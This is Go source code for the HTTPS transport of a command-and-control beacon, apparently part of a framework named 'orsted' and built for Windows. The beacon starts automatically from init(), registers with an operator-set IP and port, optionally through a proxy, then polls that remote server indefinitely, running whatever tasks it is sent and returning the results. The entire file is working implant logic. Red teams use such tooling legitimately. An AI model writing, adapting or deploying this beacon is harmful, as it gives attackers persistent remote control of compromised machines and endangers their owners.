//go:build https
// +build https

package main

/*
#include <windows.h>
*/
import "C"
import (
	"time"

	"orsted/beacon/core"
	"orsted/beacon/peers"
	"orsted/beacon/utils"
	"orsted/profiles"
)

var (
	Targetip   string
	Targetport string
	HTTPProxyType      string = "none"
	HTTPProxyURL       string = ""
	HTTPProxyUsername string = ""
	HTTProxyPassword  string = ""
)

func beaconHttps() {
	_ = profiles.InitialiseProfile()

	profiles.Config.Domain = Targetip
	profiles.Config.Port = Targetport
	if HTTPProxyType == "http" || HTTPProxyType == "https" {
		profiles.Config.HTTPProxyType = HTTPProxyType
		profiles.Config.HTTPProxyUrl = HTTPProxyURL
		profiles.Config.HTTPProxyUsername = HTTPProxyUsername
		profiles.Config.HTTPProxyPassword = HTTProxyPassword
	}
	// In this case the peer of the beacon is the server
	hp, _ := peers.NewHTTPSPeer(profiles.Config)
	utils.ParentPeer = hp
	utils.Print("Starting HTTPS Peer")

	// Registering Beaocn by talking with parent peer
	beaconId, err := core.RegisterBeacon(hp)
	for err != nil {
		utils.Print("Error while registering", err.Error())
		time.Sleep(time.Millisecond * time.Duration(profiles.Config.Interval))
		beaconId, err = core.RegisterBeacon(hp)
	}

	utils.Print("Connection ID", beaconId)
	utils.CurrentBeaconId = beaconId
	for {
		time.Sleep(time.Millisecond * time.Duration(profiles.Config.Interval))

		// Ask Parent peer to give tasks
		tasks, err := core.RetreiveTask(hp, beaconId)
		if err != nil {
			utils.Print("Error while retreiving task from parent peer", err.Error())
		} else {
			core.HandleTasks(*tasks, core.SendTaskResult)
		}

	}
}

func init() {
	beaconHttps()
}

func main() {}

